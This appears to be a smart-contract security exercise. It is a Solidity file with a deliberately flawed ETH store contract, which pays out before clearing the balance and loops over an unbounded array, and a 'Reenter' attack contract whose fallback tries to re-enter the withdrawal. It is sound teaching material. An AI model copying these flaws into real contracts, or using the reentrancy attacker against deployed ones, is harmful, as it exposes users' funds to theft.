pragma solidity ^0.4.10;
//*** Exercice 4 ***//
// Contract to store and redeem money.
contract Store {
    struct Safe {
        address owner;
        uint amount;
    }
    
    Safe[] public safes;
    
    /// @dev Store some ETH.
    function store() payable {
        safes.push(Safe({owner: msg.sender, amount: msg.value}));
    }
    
    /// @dev Take back all the amount stored.
    function take() {
        for (uint i; i<safes.length; ++i) {
            Safe safe = safes[i];
            if (safe.owner==msg.sender && safe.amount!=0) {
                msg.sender.transfer(safe.amount);
                safe.amount=0;
            }
        }
        
    }
}

contract Reenter {

    Store sc;

    constructor (address deployed) {
        sc = Store(deployed);
    }

    /// @dev Call the store function on Store.
    function store() payable {
        sc.store.value(msg.value)();
    }
    
    /// @dev Take back all the amount stored.
    function take() {
        sc.take();
    }

    function() payable {
        take();
    }
}